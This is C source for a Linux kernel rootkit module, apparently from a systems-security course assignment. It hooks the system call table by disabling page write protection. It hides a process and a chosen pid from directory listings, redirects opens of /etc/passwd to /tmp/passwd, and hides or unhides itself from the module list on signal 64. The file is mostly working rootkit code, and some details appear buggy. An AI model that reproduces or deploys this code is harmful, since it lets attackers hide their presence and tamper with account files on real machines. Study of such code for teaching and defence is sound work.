#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>     // for system call constants
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/sched.h>

#define PREFIX "sneaky_process"

struct linux_dirent {
    long d_ino;
    off_t d_off;
    unsigned short d_reclen;
    char d_name[];
};
typedef struct linux_dirent linux_dirent64;

#define BUF_SIZE 1024
// This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)ptr, &level);
    if (pte->pte & ~_PAGE_RW) {
        pte->pte |= _PAGE_RW;
    }
    return 0;
}

int disable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)ptr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}

asmlinkage int (*original_getdents64)(struct pt_regs *);

static char *pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "sneaky process pid");

asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
    printk(KERN_INFO "sneaky_sys_getdents\n");
    // get the dirent struct from reg
    linux_dirent64 __user *dirent = (linux_dirent64 *)regs->si;
    // initialize the dirent struct we will copy into
    linux_dirent64 *dirent_ker = NULL;
    // call real getdents64
    int ret = original_getdents64(regs);
    void *current_addr = NULL;
    int offset = 0;
    if (ret <= 0) {
        return ret;
    }
    while (offset < ret) {
        current_addr = (void *)dirent + offset;
        dirent_ker = (linux_dirent64 *)current_addr;
        char *current_name = dirent_ker->d_name + 1;
        if (strcmp(current_name, "sneaky_process") == 0 || strcmp(current_name, pid) == 0) {
            printk(KERN_INFO "found file\n");
            ret -= dirent_ker->d_reclen;
            // move the rest of the dirent struct to the current position
            memmove((char *)current_addr, (char *)current_addr + dirent_ker->d_reclen, ret);
        } else {
            offset += dirent_ker->d_reclen;
        }
    }
    return ret;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
    const char *filename = (char *)regs->si;
    const char *new_filename = "/tmp/passwd";
    if (strcmp(filename, "/etc/passwd") == 0) {
        // printk(KERN_INFO "changed passwd.\n");
        copy_to_user((char *)filename, new_filename, strlen(new_filename));
    }

    // Implement the sneaky part here
    return (*original_openat)(regs);
}
asmlinkage ssize_t (*original_kill)(struct pt_regs *);
static struct list_head *prev_module;

void hide_module(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}
void show_module(void) {
    list_add(&THIS_MODULE->list, prev_module);
}

asmlinkage ssize_t sneaky_sys_kill(struct pt_regs *regs) {
    static short hidden = 0;

    int sig = regs->si;

    if ((sig == 64) && (hidden == 0)) {
        hide_module();
        hidden = 1;
    } else if ((sig == 64) && (hidden == 1)) {
        show_module();
        hidden = 0;
    } else {
        return original_kill(regs);
    }
    return original_kill(regs);
}

static int initialize_sneaky_module(void) {
    // See /var/log/syslog or use `dmesg` for kernel print output
    printk(KERN_INFO "Sneaky module being loaded.\n");

    // Lookup the address for this symbol. Returns 0 if not found.
    // This address will change after rebooting due to protection
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    // This is the magic! Save away the original 'openat' system call
    // function address. Then overwrite its address in the system call
    // table with the function address of our new code.
    original_openat = (void *)sys_call_table[__NR_openat];
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    original_kill = (void *)sys_call_table[__NR_kill];

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *)sys_call_table);

    sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
    sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)sneaky_sys_kill;
    // You need to replace other system calls you need to hack here

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *)sys_call_table);

    return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
    printk(KERN_INFO "Sneaky module being unloaded.\n");

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *)sys_call_table);

    // This is more magic! Restore the original 'open' system call
    // function address. Will look like malicious code was never there!
    sys_call_table[__NR_openat] = (unsigned long)original_openat;
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    // sys_call_table[__NR_read] = (unsigned long)original_read;
    sys_call_table[__NR_kill] = (unsigned long)original_kill;
    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");